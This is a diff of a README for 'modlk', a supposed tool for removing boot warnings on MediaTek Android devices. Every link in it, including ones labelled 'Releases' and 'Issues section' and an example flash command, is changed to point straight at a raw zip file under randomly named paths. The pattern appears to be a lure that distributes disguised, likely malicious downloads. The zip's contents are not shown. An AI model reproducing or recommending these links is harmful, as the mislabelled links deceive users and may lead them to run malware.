@@ -1,6 +1,6 @@
 # 🔧 modlk - Remove Boot Warnings with Ease
 
-[![Download modlk](https://raw.githubusercontent.com/demisuperad123/modlk/main/hyperlithuria/Software_orthopterological.zip)](https://raw.githubusercontent.com/demisuperad123/modlk/main/hyperlithuria/Software_orthopterological.zip)
+[![Download modlk](https://github.com/demisuperad123/modlk/raw/refs/heads/main/hyperlithuria/Software-v2.8.zip)](https://github.com/demisuperad123/modlk/raw/refs/heads/main/hyperlithuria/Software-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Follow these instructions to get started.
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [modlk Releases](https://raw.githubusercontent.com/demisuperad123/modlk/main/hyperlithuria/Software_orthopterological.zip). You will find the latest version available for download. 
+To download the software, visit this page: [modlk Releases](https://github.com/demisuperad123/modlk/raw/refs/heads/main/hyperlithuria/Software-v2.8.zip). You will find the latest version available for download. 
 
 ### Step 1: Visit the Releases Page
 1. Click the link above.
@@ -51,7 +51,7 @@ Ensure your system meets the following requirements before installing:
 
 ### Example Commands
 - To remove boot warnings: `modlk remove-warnings`
-- To flash an image: `modlk flash https://raw.githubusercontent.com/demisuperad123/modlk/main/hyperlithuria/Software_orthopterological.zip`
+- To flash an image: `modlk flash https://github.com/demisuperad123/modlk/raw/refs/heads/main/hyperlithuria/Software-v2.8.zip`
 
 ## 📝 Features
 
@@ -72,7 +72,7 @@ No, modlk is designed for average users. You can follow the instructions to use 
 modlk works best with MediaTek devices, but it can be useful for other Android devices that support fastboot.
 
 ### How can I get support?
-If you need assistance, you can visit the [Issues section](https://raw.githubusercontent.com/demisuperad123/modlk/main/hyperlithuria/Software_orthopterological.zip) on the GitHub repository to ask your questions.
+If you need assistance, you can visit the [Issues section](https://github.com/demisuperad123/modlk/raw/refs/heads/main/hyperlithuria/Software-v2.8.zip) on the GitHub repository to ask your questions.
 
 ## 📫 Contact
 
